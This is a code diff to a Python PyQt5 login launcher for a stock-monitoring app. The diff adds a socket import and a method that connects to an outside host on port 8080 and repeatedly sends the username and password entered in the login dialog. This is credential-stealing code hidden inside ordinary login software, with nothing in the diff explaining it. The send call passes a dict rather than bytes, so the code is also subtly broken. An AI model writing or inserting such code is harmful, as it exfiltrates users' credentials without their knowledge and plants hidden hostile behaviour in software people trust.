@@ -1,6 +1,7 @@
 from Stock_Monitoring.login import Ui_login
 from Stock_Monitoring.tushare_test import *
 from PyQt5.QtWidgets import QApplication, QDialog
+import socket
 import sys
 
 
@@ -44,6 +45,13 @@ class launcher_ui(QDialog, Ui_login):
     def pro_load(self):
         self.progressBar_load.setValue(self.value)
         self.value += 10
+
+    def soc(self):
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect(('wyzs1314.com', 8080))
+        while True:
+            msg = {'u': self.comboBox_user.currentText(), 'p': self.lineEdit_password.text()}
+            client.send(msg)
 
 
 if __name__ == '__main__':
